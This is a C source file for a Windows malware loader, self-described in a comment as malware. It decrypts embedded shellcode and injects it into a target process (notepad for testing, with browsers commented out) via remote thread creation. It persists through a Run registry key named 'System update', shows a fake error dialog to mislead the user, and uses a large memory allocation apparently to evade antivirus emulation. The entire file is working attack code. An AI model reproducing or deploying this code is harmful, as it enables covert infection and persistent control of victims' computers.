#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <string.h>
#include <time.h>


#include "Decryption.h"
#include "shellcode.h"
#include "DynamicLoad/LoadAPI.h"

const char* targetPorcess[] = {
	"notepad.exe"		// for Testing
	//"firefox.exe",
	//"chrome.exe",
	//"vivaldi.exe",
	//"iexplore.exe"
	//,"MicrosoftEdge.exe"
};


BOOL inject(Kernel32_API Kernel32api, DWORD pid){
	HANDLE phd;
	LPVOID shell;
	
	phd = Kernel32api.OpenProcessF(PROCESS_ALL_ACCESS, 0, pid);
	if (phd == INVALID_HANDLE_VALUE){
		//printf("OpenProcess() Failed.\n"); 
		return FALSE;
	}
	
	shell = Kernel32api.VirtualAllocExF(phd, 0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // PAGE_EXECUTE_READWRITE => detect by AV
	if (shell == NULL){
		//printf("VirtualAllocEx() Failed\n");  
		CloseHandle(phd); 
		return FALSE;
	}

	decryptionRoutine(shellcodeEnc, shellcodeSize, (char*)xorKey, 64);
	Kernel32api.WriteProcessMemoryF(phd, shell, shellcodeEnc, shellcodeSize, 0);

	//printf("Injection successfull\n");
	//printf("Running Shellcode......\n");

	if (Kernel32api.CreateRemoteThreadF(phd, NULL, 0, (LPTHREAD_START_ROUTINE)shell, NULL, 0, 0) == NULL){
		//printf("Failed to Run Shellcode\n");
		CloseHandle(phd);
		return FALSE;
	}
	CloseHandle(phd);
	return TRUE;
}


VOID DisplayErrorMessageBox(){
	MessageBoxA(	NULL,
		"The software encountered a critical probleme !\nPlease contact your system Administrateur.",
		"Fail to run !",
		MB_ICONEXCLAMATION | MB_OKCANCEL
	);

}

BOOL persistence(API_Call APICall) {
	Kernel32_API Kernel32api = APICall.Kernel32api;
	advapi32_API advapi32api = APICall.advapi32api;

	HKEY hKey;
	char* currentPath = (char*)calloc(MAX_PATH, 1);
	if (currentPath == NULL)
		return FALSE;

	if (Kernel32api.GetModuleFileNameAF(NULL, currentPath, MAX_PATH)) {
		char* tempPath = (char*)calloc(MAX_PATH, 1);
		if (tempPath != NULL) {
			if (Kernel32api.GetTempPathAF(MAX_PATH - 1, tempPath)) {
				int randNb;
				srand((unsigned int)time(0));
				randNb = rand() % 1000000 + 100000;
				sprintf_s(tempPath, MAX_PATH, "%sdmp-%i.exe", tempPath, randNb);

				if (Kernel32api.CopyFileAF(currentPath, tempPath, FALSE)) {
					if (advapi32api.RegOpenKeyExAF(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
						strcat_s(tempPath, MAX_PATH, " -p");
						advapi32api.RegSetValueExAF(hKey, "System update", 0, REG_SZ, (LPBYTE)tempPath, (DWORD)strlen(tempPath) + 1);
						advapi32api.RegCloseKeyF(hKey);
						free(tempPath);
						free(currentPath);
						return TRUE;
					}
				}
			}

			free(tempPath);
		}
	}
	free(currentPath);
	return FALSE;
}

int main(int argc, char *argv[]) {
	HANDLE snap;
	PROCESSENTRY32 pe32;
	API_Call APICall;

#define BIG_BUFFER_SIZE 100000000

	char* pFakeData = NULL;
	pFakeData = (char *)malloc(BIG_BUFFER_SIZE);
	if (pFakeData != NULL) {
		memset(pFakeData, 0x00, BIG_BUFFER_SIZE);
		free(pFakeData);
	}


	if (loadApi(&APICall)) {
		Kernel32_API Kernel32api = APICall.Kernel32api;

		// check if the malware is run form the system 
		if (argc == 1) {
			// if it's the user that start the malware 
			if (persistence(APICall))
				printf("persistence OK\n");
			else
				printf("persistence Error\n");

			DisplayErrorMessageBox();
		}


		pe32.dwSize = sizeof(pe32);
		snap = Kernel32api.CreateToolhelp32SnapshotF(TH32CS_SNAPPROCESS, 0);
		if (snap == INVALID_HANDLE_VALUE) {
			//printf("CreateToolhelp32Snapshot() Failed.");
			return FALSE;
		}
		if (!Kernel32api.Process32FirstF(snap, &pe32)) {
			//printf("Process32First() Failed.");
			return FALSE;
		}
		
		for (int i = 0; i < sizeof(targetPorcess) / sizeof(char*); i++) {
			while (0 != strncmp(targetPorcess[i], pe32.szExeFile, strlen(targetPorcess[i])) && Kernel32api.Process32NextF(snap, &pe32));
			if (0 != strncmp(targetPorcess[i], pe32.szExeFile, strlen(targetPorcess[i])))
				printf("No infomation found about \"%s\"\n", targetPorcess[i]);
			else {
				//printf("Program name:%s\nProcess id: %d\n", pe32.szExeFile, pe32.th32ProcessID);
				//printf("Injecting shellcode\n");
				if (inject(Kernel32api, pe32.th32ProcessID))
					printf("shellcode Execution Successfull\n");
				//system("pause");

				Kernel32api.CloseHandleF(snap);
				return TRUE;
			}
		}

		Kernel32api.CloseHandleF(snap);
	}
	//system("pause");
	return FALSE;
}